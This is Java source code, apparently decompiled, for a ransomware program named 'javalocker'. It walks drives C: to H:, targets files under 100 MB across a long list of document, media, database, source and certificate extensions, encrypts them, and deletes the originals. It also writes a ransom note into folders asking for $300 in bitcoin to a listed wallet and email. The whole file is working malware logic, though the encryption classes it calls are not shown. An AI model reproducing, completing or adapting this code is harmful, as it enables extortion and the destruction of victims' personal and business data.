 package javabasic;
 
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileReader;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.Writer;
 import java.util.Arrays;
 import java.util.LinkedList;
 import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class JAVABASIC
 {
   public static Encryption enf = new Encryption();
   
   private static String findexname(String filename) {
     String pa = "\\.[^\\.]*$";
     Pattern p = Pattern.compile(pa);
     Matcher mc = p.matcher(filename);
     boolean bl = mc.find();
     if (!bl)
     {
       return ".";
     }
     int s = mc.start();
     int e = mc.end();
     int j = 0;
     StringBuilder bu = new StringBuilder();
     for (int i = s; i < e; i++)
     {
       bu.append(filename.charAt(i));
     }
     return bu.toString();
   }
   public static String readFileContent(String fileName) {
     File file = new File(fileName);
     BufferedReader reader = null;
     StringBuffer sbf = new StringBuffer();
     try {
       reader = new BufferedReader(new FileReader(file));
       String tempStr;
       while ((tempStr = reader.readLine()) != null) {
         sbf.append(tempStr);
       }
       reader.close();
       return sbf.toString();
     } catch (IOException iOException) {
 
     
     } finally {
       if (reader != null) {
         try {
           reader.close();
         } catch (IOException iOException) {}
       }
     } 
 
 
     
     return sbf.toString();
   }
   public static boolean rename(File file, String newName) {
     if (file == null) return false; 
     if (!file.exists()) return false; 
     if (newName.equals(file.getName())) return true; 
     File newFile = new File(file.getParent() + File.separator + newName);
     return (!newFile.exists() && file
       .renameTo(newFile));
   }
   
   public static void tryencrpt(String p) {
     String[] type = { ".accdb", ".pub", ".reg", ".ico", ".mui", ".onetoc2", ".dwg", ".wk1", ".wks", ".vsdx", ".vsd", ".eml", ".msg", ".ost", ".pst", ".pptx", ".jfif", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".ost", ".msg", ".eml", ".vsd", ".txt", ".csv", ".rtf", ".123", ".wks", ".pdf", ".dwg", ".onetoc2", ".snt", ".snt", ".jpeg", ".jpg", ".docb", ".docm", ".zip", ".7z", ".rar", ".mp4", ".wav", ".mp3", ".cpp", ".gho", ".iso", ".mui", ".flv", ".wma", ".key", ".sln", ".vbs", ".bat", ".cs", ".ini", ".cmd", ".lv", ".c", ".js", ".php", ".mp4", ".html", ".py", ".docb", ".pps", ".gz", ".gpg", ".xlsm", ".vmdk", ".vmx", ".pot", ".pps", ".ppsm", ".ppsx", ".ppam", ".potx", ".potm", ".edb", ".hwp", ".602", ".sxi", ".sti", ".sldx", ".sldm", ".vdi", ".aes", ".arc", ".paq", ".bz2", ".tbk", ".bak", ".tar", ".gz", ".backup", ".vcd", ".bmp", ".png", ".gif", ".raw", ".cgm", ".tif", ".tiff", ".nef", ".psd", ".ai", ".svg", ".djvu", ".m4u", ".m3u", ".mid", ".wma", ".3g2", ".mkv", ".3gp", ".mov", ".avi", ".asf", ".asf", ".mpeg", ".vob", ".mpg", ".wmv", ".fla", ".swf", ".wav", ".sh", ".rb", ".asp", ".php", ".jsp", ".brd", ".sch", ".dch", ".dip", ".dp", ".vb", ".vbs", ".ps1", ".asm", ".h", ".pas", ".suo", ".ldf", ".mdf", ".ibd", ".myi", ".myd", ".frm", ".obd", ".dbf", ".db", ".mdb", ".accdb", ".sql", ".sqlitedb", ".sqlite3", ".asc", ".lay6", ".lay", ".mml", ".sxm", ".otg", ".odg", ".uop", ".std", ".sxd", ".otp", ".odp", ".wb2", ".slk", ".dif", ".stc", ".sxc", ".ots", ".ods", ".3dm", ".max", ".3ds", ".uot", ".stw", ".sxw", ".ott", ".odt", ".pem", ".p12", ".csr", ".crt", ".pfx", ".der" };
     String res = findexname(p);
     res.trim();
     for (String s : type) {
       
       if (res.compareToIgnoreCase(s) == 0) {
         
         Writer out = null;
         String con = readFileContent(p);
         try {
           key.main(p, p + ".javalocker");
         } catch (Exception exception) {}
 
         
         File f = new File(p);
         if (f.canWrite())
           f.delete(); 
       } 
     } 
   }
   public static void folderMethod1(String path) {
     int fileNum = 0, folderNum = 0;
     File file = new File(path);
     LinkedList<File> list = new LinkedList<>();
     if (file.exists()) {
       if (null == file.listFiles()) {
         return;
       }
       list.addAll(Arrays.asList(file.listFiles()));
       while (!list.isEmpty()) {
         File[] files = ((File)list.removeFirst()).listFiles();
         if (null == files) {
           continue;
         }
         for (File f : files) {
           if (f.isDirectory() && !f.getAbsolutePath().startsWith("C:\\Windows")) {
             
             File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
             
             try {
               fj.createNewFile();
               if (fj.canWrite())
               {
                 Writer out = null;
                 out = new FileWriter(fj);
                 String data = "Q: What Happen to my computer?\n A:Your personal files are encrypted by javalocker!\nQ How can I recover my Files? A You need to send 300$ of bitcoins to the following adress:BAW4VM2dhxYgXeQepOHKHSQVG6NgaEb94 then contact soviet@12334@gmail.com!";
                 out.write(data);
                 out.close();
               }
             
             } catch (IOException iOException) {}
             
             list.add(f);
             folderNum++;
           
           }
           else {
             
             if (f.length() < 104857600L) {
               
               tryencrpt(f.getAbsolutePath());
               File fgf = new File(f.getPath() + "DESkey.dat");
               fgf.delete();
             } 
             fileNum++;
           } 
         } 
       } 
     } 
   }
 
   public static void find2(String path) {
     File file = new File(path);
     File[] fs = file.listFiles();
     if (fs == null) {
       return;
     }
     
     for (File f : fs) {
       
       if (!f.isDirectory() && !f.getAbsolutePath().startsWith("C:\\Windows")) {
         
         if (f.length() < 104857600L)
         {
           tryencrpt(f.getAbsolutePath());
         }
       }
       else {
         
         File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
        
         try {
           fj.createNewFile();
           if (fj.canWrite()) {
             
             Writer out = null;
             out = new FileWriter(fj);
             String data = "Q: What Happen to my computer?\n A:Your personal files are encrypted by javalocker!\nQ How can I recover my Files? A You need to send 300$ of bitcoins to the following adress:BAW4VM2dhxYgXeQepOHKHSQVG6NgaEb94 then contact soviet@12334@gmail.com!";
             out.write(data);
             out.close();
           } 
         } catch (IOException iOException) {}
       } 
     } 
   }
  
   public static void ret(File f) {
     File fj = new File(f.getAbsolutePath() + "\\readmeonnotepad.javaencrypt");
 
     
     try {
       fj.createNewFile();
       if (fj.canWrite()) {
         
         Writer out = null;
         out = new FileWriter(fj);
         String data = "Q: What Happen to my computer?\n A:Your personal files are encrypted by javalocker!\nQ How can I recover my Files? A You need to send 300$ of bitcoins to the following adress:BAW4VM2dhxYgXeQepOHKHSQVG6NgaEb94 then contact soviet@12334@gmail.com!";
         out.write(data);
         out.close();
       } 
     } catch (IOException iOException) {}
   }
  
   public static void main(String[] args) throws IOException, Exception {
     Scanner sc = new Scanner(System.in);
     ret(new File("C:\\"));
     ret(new File("D:\\"));
     ret(new File("E:\\"));
     ret(new File("F:\\"));
     ret(new File("G:\\"));
     ret(new File("H:\\"));
     find2("D:\\");
     folderMethod1("D:\\");
     find2("E:\\");
     folderMethod1("E:\\");
     find2("F:\\");
     folderMethod1("F:\\");
     find2("G:\\");
     folderMethod1("G:\\");
     find2("H:\\");
     folderMethod1("H:\\");
     find2("C:\\");
     folderMethod1("C:\\");
   }
 }
